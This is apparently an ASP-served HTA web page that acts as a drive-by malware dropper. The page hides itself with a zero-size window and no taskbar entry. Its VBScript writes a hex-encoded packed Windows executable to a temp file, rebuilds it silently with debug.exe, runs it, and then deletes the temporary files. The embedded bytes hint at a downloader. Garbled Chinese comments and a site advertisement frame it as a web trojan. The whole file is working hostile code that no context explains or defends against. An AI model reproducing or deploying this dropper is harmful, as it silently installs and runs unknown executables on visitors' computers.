<%Response.ContentType="Application/Hta"%>
<hta:application height="0" width="0" caption="no" border="none" showintaskbar="no">
<html>
<head>
<meta name="Generator" content="Microsoft Notepad">
<title>������ҳľ��ԭ��: chin��</title>
<meta name="Version" content="1.3.10.13">
<meta name="Author" content = "chin">
<script language="JavaScript">
<!--
window.moveTo(0,0);
window.resizeTo(0,0);
//-->
</script>
</head>
<body>
<script language="VBScript">
<!--

On Error Resume Next

'��������������������������������������
'������ľ����������߷��� ľ��۹�   ��
'��  ��վÿ�����   �������߽��     ��
'��     http://www.mmbest.com        ��
'��������������������������������������
dim WSHshell,fs,a
dim fn_tmp,fn_com,fn_exe
Set WSHshell=CreateObject("Wscript.Shell")
Set fs=CreateObject("Scripting.FileSystemObject")
fn_tmp=fs.GetSpecialFolder(2)&Chr(92)&Right(fs.GetTempName,8)
fn_com=Replace(fn_tmp,".tmp",".com",1,-1,1)
fn_exe=Replace(fn_tmp,".tmp",".exe",1,-1,1)

Set a=fs.CreateTextFile(fn_tmp,1)
a.Write "e100 4D 5A 50 00 02 00 00 00 04 00 0F 00 FF FF 00 00"&vbCrLf
a.Write "e110 B8 00 00 00 00 00 00 00 40 00 1A 00 00 00 00 00"&vbCrLf
a.Write "e120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e130 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 00"&vbCrLf
a.Write "e140 50 45 00 00 4C 01 02 00 46 53 47 21 00 00 00 00"&vbCrLf
a.Write "e150 00 00 00 00 E0 00 8F 81 0B 01 00 00 00 02 00 00"&vbCrLf
a.Write "e160 00 08 00 00 00 00 00 00 A4 72 00 00 00 10 00 00"&vbCrLf
a.Write "e170 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00"&vbCrLf
a.Write "e180 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00"&vbCrLf
a.Write "e190 00 80 00 00 00 04 00 00 00 00 00 00 02 00 00 00"&vbCrLf
a.Write "e1A0 00 00 10 00 00 40 00 00 00 00 10 00 00 10 00 00"&vbCrLf
a.Write "e1B0 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e1C0 93 73 00 00 34 00 00 00 00 70 00 00 00 02 00 00"&vbCrLf
a.Write "e1D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e1E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e1F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e240 00 60 00 00 00 10 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e250 00 00 00 00 00 00 00 00 00 00 00 00 E0 00 00 C0"&vbCrLf
a.Write "e260 00 00 00 00 00 00 00 00 00 10 00 00 00 70 00 00"&vbCrLf
a.Write "e270 C7 03 00 00 00 02 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e280 00 00 00 00 E0 00 00 C0 4B 45 52 4E 45 4C 33 32"&vbCrLf
a.Write "e290 2E 64 6C 6C 00 00 00 4C 6F 61 64 4C 69 62 72 61"&vbCrLf
a.Write "e2A0 72 79 41 00 00 47 65 74 50 72 6F 63 41 64 64 72"&vbCrLf
a.Write "e2B0 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e2C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e2D0 04 04 08 04 01 00 74 40 40 00 02 00 6F 63 00 00"&vbCrLf
a.Write "e2E0 60 00 00 00 00 50 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e2F0 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 50"&vbCrLf
a.Write "e300 00 00 00 00 14 74 FC 30 00 00 00 00 00 00 01 00"&vbCrLf
a.Write "e310 0A 00 00 00 18 00 00 80 00 00 00 00 14 74 FC 30"&vbCrLf
a.Write "e320 00 00 00 00 02 00 00 00 88 00 00 80 38 00 00 80"&vbCrLf
a.Write "e330 96 00 00 80 50 00 00 80 00 00 00 00 14 74 FC 30"&vbCrLf
a.Write "e340 00 00 00 00 00 00 01 00 00 00 00 00 68 00 00 00"&vbCrLf
a.Write "e350 00 00 00 00 14 74 FC 30 00 00 00 00 00 00 01 00"&vbCrLf
a.Write "e360 00 00 00 00 78 00 00 00 00 60 00 00 10 00 00 00"&vbCrLf
a.Write "e370 00 00 00 00 00 00 00 00 20 60 00 00 24 00 00 00"&vbCrLf
a.Write "e380 00 00 00 00 00 00 00 00 06 00 44 00 56 00 43 00"&vbCrLf
a.Write "e390 4C 00 41 00 4C 00 0B 00 50 00 41 00 43 00 4B 00"&vbCrLf
a.Write "e3A0 41 00 47 00 45 00 49 00 4E 00 46 00 4F 00 00 00"&vbCrLf
a.Write "e3B0 FF 1C 25 54 40 78 19 8B C0 10 50 0C 45 1E 78 69"&vbCrLf
a.Write "e3C0 74 81 72 6F 63 65 73 C7 83 6B AF 97 6E 80 6C 33"&vbCrLf
a.Write "e3D0 32 2E 75 64 ED C3 1A 03 75 73 22 30 0E FF 35 E0"&vbCrLf
a.Write "e3E0 20 64 40 0D 08 47 E8 B7 EC 02 A3 28 04 30 10 ED"&vbCrLf
a.Write "e3F0 08 A7 84 E1 13 50 DA A4 84 0B 0C 4D C3 B8 CD 8D"&vbCrLf
a.Write "e400 54 32 0A 28 15 13 B0 21 55 8B EC 3A 33 C0 8C 68"&vbCrLf
a.Write "e410 A5 10 16 64 39 FF 30 9D 89 20 5E 05 F6 37 28 38"&vbCrLf
a.Write "e420 5A 59 EF 1C 66 68 AC 33 18 C3 E9 C2 8D EB F8 62"&vbCrLf
a.Write "e430 5D 89 83 2D 87 1F 01 AA 38 64 DD 3C 18 8D 10 E4"&vbCrLf
a.Write "e440 C8 8A 79 18 0D 02 E8 6C B9 F0 68 4C 08 5C 8E 43"&vbCrLf
a.Write "e450 64 43 58 10 2F 11 A4 71 52 36 11 08 38 8E 49 03"&vbCrLf
a.Write "e460 10 33 40 25 B0 32 D1 80 09 E8 24 B8 50 01 7F 53"&vbCrLf
a.Write "e470 11 D8 03 83 C4 F0 B8 38 0C 17 E8 D0 FE 68 68 50"&vbCrLf
a.Write "e480 A0 0A 96 CE 7D 6A 1B 04 F3 C4 75 1D 6C D4 0B 18"&vbCrLf
a.Write "e490 E8 68 79 2B 13 6F 8A 5D 0C BB B7 5E 0F C6 D1 6F"&vbCrLf
a.Write "e4A0 E0 BB 0E D2 5F B8 EB 67 D7 D3 63 B9 A4 3E 0C F7"&vbCrLf
a.Write "e4B0 31 CA 1E C3 D4 FC C4 E3 FE C7 7F B1 62 C8 30 D5"&vbCrLf
a.Write "e4C0 DF 80 70 43 3A 5C 44 07 6F 77 6E 53 59 21 2E 65"&vbCrLf
a.Write "e4D0 78 CB 1C 20 68 74 47 70 3A 2F 16 77 02 0E 2E 6D"&vbCrLf
a.Write "e4E0 75 33 3D 4E 63 6F FF BA 39 73 A0 31 81 20 20 4B"&vbCrLf
a.Write "e4F0 01 60 00 10 E2 40 E0 1C C8 09 2C 30 00 26 00 3D"&vbCrLf
a.Write "e500 4F 38 C2 82 37 B8 F3 01 24 42 03 17 9B 3A 83 C2"&vbCrLf
a.Write "e510 95 01 1C CC 22 60 03 09 01 9D 44 4C C0 0C 81 53"&vbCrLf
a.Write "e520 79 73 49 19 6E 69 74 14 C7 17 73 65 6D 00 00 01"&vbCrLf
a.Write "e530 38 50 40 F0 0E 6B 65 72 6E 60 6C 33 32 2E 64 EB"&vbCrLf
a.Write "e540 DB 83 4A E9 74 50 FC 6F 63 7C 41 FB DB D3 73 8F"&vbCrLf
a.Write "e550 07 4F B7 61 A1 4C 69 62 F3 B7 E3 79 41 81 01 5C"&vbCrLf
a.Write "e560 80 5D 55 52 4C 4D 4F 4E 3B 2E 44 77 E0 58 DD 16"&vbCrLf
a.Write "e570 C3 6F 77 6E 6C 3C 49 54 1E 46 69 1B 65 47 D5 78"&vbCrLf
a.Write "e580 51 52 18 75 74 70 06 44 65 78 62 3D 67 53 0E 72"&vbCrLf
a.Write "e590 69 6E D8 4A 48 78 EF 54 65 0C 61 5A 24 45 FF E7"&vbCrLf
a.Write "e5A0 DF 06 03 00 BB D0 01 40 00 BF 00 10 40 00 BE B0"&vbCrLf
a.Write "e5B0 70 40 00 53 BB 33 73 40 00 B2 80 A4 B6 80 FF D3"&vbCrLf
a.Write "e5C0 73 F9 33 C9 FF D3 73 16 33 C0 FF D3 73 23 B6 80"&vbCrLf
a.Write "e5D0 41 B0 10 FF D3 12 C0 73 FA 75 42 AA EB E0 E8 46"&vbCrLf
a.Write "e5E0 00 00 00 02 F6 83 D9 01 75 10 E8 38 00 00 00 EB"&vbCrLf
a.Write "e5F0 28 AC D1 E8 74 48 13 C9 EB 1C 91 48 C1 E0 08 AC"&vbCrLf
a.Write "e600 E8 22 00 00 00 3D 00 7D 00 00 73 0A 80 FC 05 73"&vbCrLf
a.Write "e610 06 83 F8 7F 77 02 41 41 95 8B C5 B6 00 56 8B F7"&vbCrLf
a.Write "e620 2B F0 F3 A4 5E EB 97 33 C9 41 FF D3 13 C9 FF D3"&vbCrLf
a.Write "e630 72 F8 C3 02 D2 75 05 8A 16 46 12 D2 C3 5B 5B 0F"&vbCrLf
a.Write "e640 B7 3B 4F 74 08 4F 74 13 C1 E7 0C EB 07 8B 7B 02"&vbCrLf
a.Write "e650 57 83 C3 04 43 43 E9 58 FF FF FF 5F BB BB 73 40"&vbCrLf
a.Write "e660 00 47 8B 37 AF 57 FF 13 95 33 C0 AE 75 FD FE 0F"&vbCrLf
a.Write "e670 74 EF FE 0F 75 06 47 FF 37 AF EB 09 FE 0F 0F 84"&vbCrLf
a.Write "e680 D4 9D FF FF 57 55 FF 53 04 89 06 AD 85 C0 75 D9"&vbCrLf
a.Write "e690 8B EC C3 BB 73 00 00 00 00 00 00 00 00 00 00 88"&vbCrLf
a.Write "e6A0 01 00 00 BB 73 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "e6B0 00 00 00 00 00 00 00 00 00 00 00 95 01 00 00 A3"&vbCrLf
a.Write "e6C0 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
a.Write "rcx"&vbCrLf
a.Write "5D0"&vbCrLf
a.Write "n "&fn_com&vbCrLf
a.Write "w"&vbCrLf
a.Write "q"&vbCrLf
a.Close
WSHshell.Run "command.com /c debug.exe<"&fn_tmp,0,1
WSHshell.Run "cmd.exe /c debug.exe<"&fn_tmp,0,1

Do
    If fs.FileExists(fn_com)=True Then        
        Chg_Run
        Exit Do
    End If   
Loop

Sub Chg_Run
    fs.CopyFile fn_com,fn_exe,1
    WSHshell.Run fn_exe
End Sub

fs.DeleteFile fn_tmp,1
fs.DeleteFile fn_com,1
Set fs=Nothing
Set WSHshell=Nothing

' --------------------------------------
' Written   By   chin  23:05:28 -9-2
'                ~~~~
'       CopyRight(C) All Rights Reserved
' --------------------------------------
window.close
//-->
</script>
</body>
</html>

